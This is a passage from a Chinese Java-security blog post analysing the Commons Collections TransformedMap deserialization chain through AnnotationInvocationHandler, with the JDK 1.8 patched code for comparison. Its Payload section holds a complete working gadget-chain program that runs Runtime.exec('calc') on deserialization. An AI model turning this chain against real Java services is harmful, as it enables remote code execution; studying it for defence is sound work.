<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">   AnnotationInvocationHandler<span style="color:#666">(</span>Class<span style="color:#666">&lt;?</span> <span style="color:#008000;font-weight:bold">extends</span> Annotation<span style="color:#666">&gt;</span> type<span style="color:#666">,</span> Map<span style="color:#666">&lt;</span>String<span style="color:#666">,</span> Object<span style="color:#666">&gt;</span> memberValues<span style="color:#666">)</span> <span style="color:#666">{</span>
        Class<span style="color:#666">&lt;?&gt;[]</span> superInterfaces <span style="color:#666">=</span> type<span style="color:#666">.</span><span style="color:#7d9029">getInterfaces</span><span style="color:#666">();</span>
        <span style="color:#008000;font-weight:bold">if</span> <span style="color:#666">(!</span>type<span style="color:#666">.</span><span style="color:#7d9029">isAnnotation</span><span style="color:#666">()</span> <span style="color:#666">||</span>
            superInterfaces<span style="color:#666">.</span><span style="color:#7d9029">length</span> <span style="color:#666">!=</span> 1 <span style="color:#666">||</span>
            superInterfaces<span style="color:#666">[</span>0<span style="color:#666">]</span> <span style="color:#666">!=</span> java<span style="color:#666">.</span><span style="color:#7d9029">lang</span><span style="color:#666">.</span><span style="color:#7d9029">annotation</span><span style="color:#666">.</span><span style="color:#7d9029">Annotation</span><span style="color:#666">.</span><span style="color:#7d9029">class</span><span style="color:#666">)</span>
            <span style="color:#008000;font-weight:bold">throw</span> <span style="color:#008000;font-weight:bold">new</span> AnnotationFormatError<span style="color:#666">(</span><span style="color:#ba2121">&#34;Attempt to create proxy for a non-annotation type.&#34;</span><span style="color:#666">);</span>
        <span style="color:#008000;font-weight:bold">this</span><span style="color:#666">.</span><span style="color:#7d9029">type</span> <span style="color:#666">=</span> type<span style="color:#666">;</span>
        <span style="color:#008000;font-weight:bold">this</span><span style="color:#666">.</span><span style="color:#7d9029">memberValues</span> <span style="color:#666">=</span> memberValues<span style="color:#666">;</span>
    <span style="color:#666">}</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="payload">Payload</h3>
<p>思路总结：</p>
<p>构建一个ChainedTransformer对象-&gt;置入TransformedMap对象的valueTransformer字段</p>
<p>-&gt;TransformedMap对象置入AnnotationInvocationHandle对象的memberValues字段。</p>
<div class="highlight"><div style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#008000;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">org.apache.commons.collections.Transformer</span><span style="color:#666">;</span>
<span style="color:#008000;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">org.apache.commons.collections.functors.InvokerTransformer</span><span style="color:#666">;</span>
<span style="color:#008000;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">org.apache.commons.collections.functors.ChainedTransformer</span><span style="color:#666">;</span>
<span style="color:#008000;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">org.apache.commons.collections.functors.ConstantTransformer</span><span style="color:#666">;</span>
<span style="color:#008000;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">org.apache.commons.collections.map.HashedMap</span><span style="color:#666">;</span>
<span style="color:#008000;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">org.apache.commons.collections.map.TransformedMap</span><span style="color:#666">;</span>
<span style="color:#008000;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">java.io.*</span><span style="color:#666">;</span>
<span style="color:#008000;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">java.util.HashMap</span><span style="color:#666">;</span>
<span style="color:#008000;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">java.lang.reflect.Constructor</span><span style="color:#666">;</span>
<span style="color:#008000;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">java.util.Map</span><span style="color:#666">;</span>
<span style="color:#008000;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">java.lang.reflect.InvocationTargetException</span><span style="color:#666">;</span>
<span style="color:#008000;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">java.lang.reflect.Method</span><span style="color:#666">;</span>

<span style="color:#008000;font-weight:bold">public</span> <span style="color:#008000;font-weight:bold">class</span> <span style="color:#00f;font-weight:bold">test</span> <span style="color:#008000;font-weight:bold">implements</span> Serializable<span style="color:#666">{</span>

<span style="color:#008000;font-weight:bold">public</span> <span style="color:#008000;font-weight:bold">static</span> <span style="color:#b00040">void</span> <span style="color:#00f">main</span><span style="color:#666">(</span>String<span style="color:#666">[]</span> args<span style="color:#666">)</span> <span style="color:#008000;font-weight:bold">throws</span> Exception
<span style="color:#666">{</span>
Transformer<span style="color:#666">[]</span> transformers <span style="color:#666">=</span> <span style="color:#666">{</span>
<span style="color:#008000;font-weight:bold">new</span> ConstantTransformer<span style="color:#666">(</span>Runtime<span style="color:#666">.</span><span style="color:#7d9029">class</span><span style="color:#666">),</span>
<span style="color:#008000;font-weight:bold">new</span> InvokerTransformer<span style="color:#666">(</span><span style="color:#ba2121">&#34;getMethod&#34;</span><span style="color:#666">,</span> <span style="color:#008000;font-weight:bold">new</span> Class<span style="color:#666">[]{</span> String<span style="color:#666">.</span><span style="color:#7d9029">class</span><span style="color:#666">,</span> Class<span style="color:#666">[].</span><span style="color:#7d9029">class</span><span style="color:#666">},</span> <span style="color:#008000;font-weight:bold">new</span> Object<span style="color:#666">[]{</span><span style="color:#ba2121">&#34;getRuntime&#34;</span><span style="color:#666">,</span> <span style="color:#008000;font-weight:bold">new</span> Class<span style="color:#666">[</span>0<span style="color:#666">]</span> <span style="color:#666">}),</span>
<span style="color:#008000;font-weight:bold">new</span> InvokerTransformer<span style="color:#666">(</span><span style="color:#ba2121">&#34;invoke&#34;</span><span style="color:#666">,</span> <span style="color:#008000;font-weight:bold">new</span> Class<span style="color:#666">[]{</span> Object<span style="color:#666">.</span><span style="color:#7d9029">class</span><span style="color:#666">,</span> Object<span style="color:#666">[].</span><span style="color:#7d9029">class</span><span style="color:#666">},</span> <span style="color:#008000;font-weight:bold">new</span> Object<span style="color:#666">[]{</span> <span style="color:#008000;font-weight:bold">null</span> <span style="color:#666">,</span><span style="color:#008000;font-weight:bold">new</span> Object<span style="color:#666">[</span>0<span style="color:#666">]}</span> <span style="color:#666">),</span>
<span style="color:#008000;font-weight:bold">new</span> InvokerTransformer<span style="color:#666">(</span><span style="color:#ba2121">&#34;exec&#34;</span><span style="color:#666">,</span>
<span style="color:#008000;font-weight:bold">new</span> Class<span style="color:#666">[]</span> <span style="color:#666">{</span>String<span style="color:#666">.</span><span style="color:#7d9029">class</span> <span style="color:#666">},</span>
<span style="color:#008000;font-weight:bold">new</span> Object<span style="color:#666">[]</span> <span style="color:#666">{</span><span style="color:#ba2121">&#34;calc&#34;</span><span style="color:#666">})</span>
<span style="color:#666">};</span>
Transformer transformerChain <span style="color:#666">=</span> <span style="color:#008000;font-weight:bold">new</span> ChainedTransformer<span style="color:#666">(</span>transformers<span style="color:#666">);</span>

Map map <span style="color:#666">=</span> <span style="color:#008000;font-weight:bold">new</span> HashMap<span style="color:#666">();</span>
map<span style="color:#666">.</span><span style="color:#7d9029">put</span><span style="color:#666">(</span><span style="color:#ba2121">&#34;value&#34;</span><span style="color:#666">,</span> <span style="color:#ba2121">&#34;2&#34;</span><span style="color:#666">);</span>

Map transformedmap <span style="color:#666">=</span> TransformedMap<span style="color:#666">.</span><span style="color:#7d9029">decorate</span><span style="color:#666">(</span>map<span style="color:#666">,</span> <span style="color:#008000;font-weight:bold">null</span><span style="color:#666">,</span> transformerChain<span style="color:#666">);</span>


Class clazz <span style="color:#666">=</span> Class<span style="color:#666">.</span><span style="color:#7d9029">forName</span><span style="color:#666">(</span><span style="color:#ba2121">&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span style="color:#666">);</span>
Constructor cons <span style="color:#666">=</span> clazz<span style="color:#666">.</span><span style="color:#7d9029">getDeclaredConstructor</span><span style="color:#666">(</span>Class<span style="color:#666">.</span><span style="color:#7d9029">class</span><span style="color:#666">,</span>Map<span style="color:#666">.</span><span style="color:#7d9029">class</span><span style="color:#666">);</span>
cons<span style="color:#666">.</span><span style="color:#7d9029">setAccessible</span><span style="color:#666">(</span><span style="color:#008000;font-weight:bold">true</span><span style="color:#666">);</span>

Object ins <span style="color:#666">=</span> cons<span style="color:#666">.</span><span style="color:#7d9029">newInstance</span><span style="color:#666">(</span>java<span style="color:#666">.</span><span style="color:#7d9029">lang</span><span style="color:#666">.</span><span style="color:#7d9029">annotation</span><span style="color:#666">.</span><span style="color:#7d9029">Retention</span><span style="color:#666">.</span><span style="color:#7d9029">class</span><span style="color:#666">,</span>transformedmap<span style="color:#666">);</span>

<span style="color:#408080;font-style:italic">//将ins序列化
</span><span style="color:#408080;font-style:italic"></span>ByteArrayOutputStream exp <span style="color:#666">=</span> <span style="color:#008000;font-weight:bold">new</span> ByteArrayOutputStream<span style="color:#666">();</span>
ObjectOutputStream oos <span style="color:#666">=</span> <span style="color:#008000;font-weight:bold">new</span> ObjectOutputStream<span style="color:#666">(</span>exp<span style="color:#666">);</span>
oos<span style="color:#666">.</span><span style="color:#7d9029">writeObject</span><span style="color:#666">(</span>ins<span style="color:#666">);</span>
oos<span style="color:#666">.</span><span style="color:#7d9029">flush</span><span style="color:#666">();</span>
oos<span style="color:#666">.</span><span style="color:#7d9029">close</span><span style="color:#666">();</span>

<span style="color:#408080;font-style:italic">//取出序列化的数据流进行反序列化，验证
</span><span style="color:#408080;font-style:italic"></span>ByteArrayInputStream out <span style="color:#666">=</span> <span style="color:#008000;font-weight:bold">new</span> ByteArrayInputStream<span style="color:#666">(</span>exp<span style="color:#666">.</span><span style="color:#7d9029">toByteArray</span><span style="color:#666">());</span>
ObjectInputStream ois <span style="color:#666">=</span> <span style="color:#008000;font-weight:bold">new</span> ObjectInputStream<span style="color:#666">(</span>out<span style="color:#666">);</span>
Object obj <span style="color:#666">=</span> <span style="color:#666">(</span>Object<span style="color:#666">)</span> ois<span style="color:#666">.</span><span style="color:#7d9029">readObject</span><span style="color:#666">();</span>

<span style="color:#666">}</span>
<span style="color:#666">}</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="三总结">三、总结</h2>
<p>从分析中可以看到，TransformedMap利用链依赖于AnnotationInvocationHandler 类的反序列漏洞是很容易触发的，因为它是Java 原生类，当然jdk要小于1.7,高版本已经修复了，比如1.8的该类代码</p>
<div class="highlight"><div style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"> ObjectInputStream<span style="color:#666">.</span><span style="color:#7d9029">GetField</span> fields <span style="color:#666">=</span> s<span style="color:#666">.</span><span style="color:#7d9029">readFields</span><span style="color:#666">();</span>

        <span style="color:#a2f">@SuppressWarnings</span><span style="color:#666">(</span><span style="color:#ba2121">&#34;unchecked&#34;</span><span style="color:#666">)</span>
        Class<span style="color:#666">&lt;?</span> <span style="color:#008000;font-weight:bold">extends</span> Annotation<span style="color:#666">&gt;</span> t <span style="color:#666">=</span> <span style="color:#666">(</span>Class<span style="color:#666">&lt;?</span> <span style="color:#008000;font-weight:bold">extends</span> Annotation<span style="color:#666">&gt;)</span>fields<span style="color:#666">.</span><span style="color:#7d9029">get</span><span style="color:#666">(</span><span style="color:#ba2121">&#34;type&#34;</span><span style="color:#666">,</span> <span style="color:#008000;font-weight:bold">null</span><span style="color:#666">);</span>
        <span style="color:#a2f">@SuppressWarnings</span><span style="color:#666">(</span><span style="color:#ba2121">&#34;unchecked&#34;</span><span style="color:#666">)</span>
        Map<span style="color:#666">&lt;</span>String<span style="color:#666">,</span> Object<span style="color:#666">&gt;</span> streamVals <span style="color:#666">=</span> <span style="color:#666">(</span>Map<span style="color:#666">&lt;</span>String<span style="color:#666">,</span> Object<span style="color:#666">&gt;)</span>fields<span style="color:#666">.</span><span style="color:#7d9029">get</span><span style="color:#666">(</span><span style="color:#ba2121">&#34;memberValues&#34;</span><span style="color:#666">,</span> <span style="color:#008000;font-weight:bold">null</span><span style="color:#666">);</span>

        <span style="color:#408080;font-style:italic">// Check to make sure that types have not evolved incompatibly
</span><span style="color:#408080;font-style:italic"></span>
        AnnotationType annotationType <span style="color:#666">=</span> <span style="color:#008000;font-weight:bold">null</span><span style="color:#666">;</span>
        <span style="color:#008000;font-weight:bold">try</span> <span style="color:#666">{</span>
            annotationType <span style="color:#666">=</span> AnnotationType<span style="color:#666">.</span><span style="color:#7d9029">getInstance</span><span style="color:#666">(</span>t<span style="color:#666">);</span>
        <span style="color:#666">}</span> <span style="color:#008000;font-weight:bold">catch</span><span style="color:#666">(</span>IllegalArgumentException e<span style="color:#666">)</span> <span style="color:#666">{</span>
            <span style="color:#408080;font-style:italic">// Class is no longer an annotation type; time to punch out
</span><span style="color:#408080;font-style:italic"></span>            <span style="color:#008000;font-weight:bold">throw</span> <span style="color:#008000;font-weight:bold">new</span> java<span style="color:#666">.</span><span style="color:#7d9029">io</span><span style="color:#666">.</span><span style="color:#7d9029">InvalidObjectException</span><span style="color:#666">(</span><span style="color:#ba2121">&#34;Non-annotation type in annotation serial stream&#34;</span><span style="color:#666">);</span>
        <span style="color:#666">}</span>

        Map<span style="color:#666">&lt;</span>String<span style="color:#666">,</span> Class<span style="color:#666">&lt;?&gt;&gt;</span> memberTypes <span style="color:#666">=</span> annotationType<span style="color:#666">.</span><span style="color:#7d9029">memberTypes</span><span style="color:#666">();</span>
        <span style="color:#408080;font-style:italic">// consistent with runtime Map type
</span><span style="color:#408080;font-style:italic"></span>        Map<span style="color:#666">&lt;</span>String<span style="color:#666">,</span> Object<span style="color:#666">&gt;</span> mv <span style="color:#666">=</span> <span style="color:#008000;font-weight:bold">new</span> LinkedHashMap<span style="color:#666">&lt;&gt;();</span>

        <span style="color:#408080;font-style:italic">// If there are annotation members without values, that
</span><span style="color:#408080;font-style:italic"></span>        <span style="color:#408080;font-style:italic">// situation is handled by the invoke method.
</span><span style="color:#408080;font-style:italic"></span>        <span style="color:#008000;font-weight:bold">for</span> <span style="color:#666">(</span>Map<span style="color:#666">.</span><span style="color:#7d9029">Entry</span><span style="color:#666">&lt;</span>String<span style="color:#666">,</span> Object<span style="color:#666">&gt;</span> memberValue <span style="color:#666">:</span> streamVals<span style="color:#666">.</span><span style="color:#7d9029">entrySet</span><span style="color:#666">())</span> <span style="color:#666">{</span>
            String name <span style="color:#666">=</span> memberValue<span style="color:#666">.</span><span style="color:#7d9029">getKey</span><span style="color:#666">();</span>
            Object value <span style="color:#666">=</span> <span style="color:#008000;font-weight:bold">null</span><span style="color:#666">;</span>
            Class<span style="color:#666">&lt;?&gt;</span> memberType <span style="color:#666">=</span> memberTypes<span style="color:#666">.</span><span style="color:#7d9029">get</span><span style="color:#666">(</span>name<span style="color:#666">);</span>
            <span style="color:#008000;font-weight:bold">if</span> <span style="color:#666">(</span>memberType <span style="color:#666">!=</span> <span style="color:#008000;font-weight:bold">null</span><span style="color:#666">)</span> <span style="color:#666">{</span>  <span style="color:#408080;font-style:italic">// i.e. member still exists
</span><span style="color:#408080;font-style:italic"></span>                value <span style="color:#666">=</span> memberValue<span style="color:#666">.</span><span style="color:#7d9029">getValue</span><span style="color:#666">();</span>
                <span style="color:#008000;font-weight:bold">if</span> <span style="color:#666">(!(</span>memberType<span style="color:#666">.</span><span style="color:#7d9029">isInstance</span><span style="color:#666">(</span>value<span style="color:#666">)</span> <span style="color:#666">||</span>
                      value <span style="color:#008000;font-weight:bold">instanceof</span> ExceptionProxy<span style="color:#666">))</span> <span style="color:#666">{</span>
                    value <span style="color:#666">=</span> <span style="color:#008000;font-weight:bold">new</span> AnnotationTypeMismatchExceptionProxy<span style="color:#666">(</span>
                            value<span style="color:#666">.</span><span style="color:#7d9029">getClass</span><span style="color:#666">()</span> <span style="color:#666">+</span> <span style="color:#ba2121">&#34;[&#34;</span> <span style="color:#666">+</span> value <span style="color:#666">+</span> <span style="color:#ba2121">&#34;]&#34;</span><span style="color:#666">).</span><span style="color:#7d9029">setMember</span><span style="color:#666">(</span>
                                annotationType<span style="color:#666">.</span><span style="color:#7d9029">members</span><span style="color:#666">().</span><span style="color:#7d9029">get</span><span style="color:#666">(</span>name<span style="color:#666">));</span>
                <span style="color:#666">}</span>
            <span style="color:#666">}</span>
            mv<span style="color:#666">.</span><span style="color:#7d9029">put</span><span style="color:#666">(</span>name<span style="color:#666">,</span> value<span style="color:#666">);</span>
        <span style="color:#666">}</span>
</code></pre></td></tr></table>
</div>
</div>
        </div>
        
        <div class="my-4">
    
    <a href="/tags/java%E5%AE%89%E5%85%A8/" class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 mr-2 hover:text-eureka">#java安全</a>
    
    <a href="/tags/web/" class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 mr-2 hover:text-eureka">#web</a>
    
</div>
        
        
        


        
        
        <div class="py-2">
    
    <div class="flex flex-col md:flex-row items-center my-8">
        <a href="/authors/oulaa/" class="w-24 h-24 md:mr-4">
            
            
            <img src="/images/t.jpg" class="w-full bg-primary-bg rounded-full" alt="Avatar">
            
        </a>
        <div class="w-full md:w-auto mt-4 md:mt-0">
            <a href="/authors/oulaa/" class="block font-bold text-lg pb-1 mb-2 border-b">Oulaa</a>
            <span class="block pb-2">黑白之色，无间之守</span>
            
            
            
            
            
            <a href="mailto:example@example.com" class="mr-1">
                <i class="fas fa-envelope"></i>
            </a>
            
            
            
            
            
            <a href="https://example.com/" class="mr-1">
                <i class="fab fa-twitter"></i>
            </a>
            
            
            
            
            
            <a href="https://example.com/" class="mr-1">
                <i class="fab fa-github"></i>
            </a>
            
        </div>
    </div>
    
</div>
        
        
        
<div class="flex flex-col md:flex-row md:justify-between -mx-2 mt-4 px-2 pt-4 border-t">
    <div>
        
        <span class="block font-bold">Previous</span>
        <a href="/posts/22205/" class="block">CVE-2021-22205 复现</a>
        
    </div>
    <div class="md:text-right mt-4 md:mt-0">
        
        <span class="block font-bold">Next</span>
        <a href="/posts/j1/" class="block">JAVA安全基础之动态代理</a>
        
    </div>
</div>

        



    </div>
    
    <div class="col-span-2">
        
        
        <div class="sticky top-16 z-10 hidden lg:block px-6 py-4  bg-primary-bg ">
    <span class="text-lg font-semibold">On This Page</span>
</div>
<div class="sticky-toc hidden lg:block px-6 pb-6 ">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#一复现环境">一、复现环境</a></li>
    <li><a href="#二分析">二、分析</a>
      <ul>
        <li><a href="#constanttransformer类">ConstantTransformer类</a></li>
        <li><a href="#invokertransformer">InvokerTransformer</a></li>
        <li><a href="#chainedtransformer">ChainedTransformer</a></li>
        <li><a href="#transformedmap类">TransformedMap类</a></li>
        <li><a href="#abstractinputcheckedmapdecoratormapentry">AbstractInputCheckedMapDecorator.MapEntry</a></li>
        <li><a href="#annotationinvocationhandler类jdk版本要小于18">AnnotationInvocationHandler类（JDK版本要小于1.8）</a></li>
        <li><a href="#payload">Payload</a></li>
      </ul>
    </li>
    <li><a href="#三总结">三、总结</a></li>
  </ul>
</nav>
</div>
<script>
    window.addEventListener('DOMContentLoaded', () => {
        enableStickyToc();
    });
</script>
        
    </div>
    

    
    
    <div
        class="col-span-2  lg:col-span-6 bg-secondary-bg rounded p-6">
        <h2 class="text-lg font-semibold mb-4">See Also</h2>
        <div class="content">
            
            <a href="/posts/j1/">JAVA安全基础之动态代理</a>
            <br />
            
        </div>
    </div>
    
</div>
<script>
    document.addEventListener('DOMContentLoaded', ()=>{
        hljs.initHighlightingOnLoad();
    })
</script>

      </div>
    </div>
    
  </main>
  <footer class="pl-scrollbar">
    <div class="w-full max-w-screen-xl mx-auto"><div class="text-center p-6 pin-b">
    <p class="text-sm text-tertiary-text">&copy; 2021 <a href="https://www.wangchucheng.com/">C. Wang</a> and <a href="https://www.ruiqima.com/">R. Ma</a>
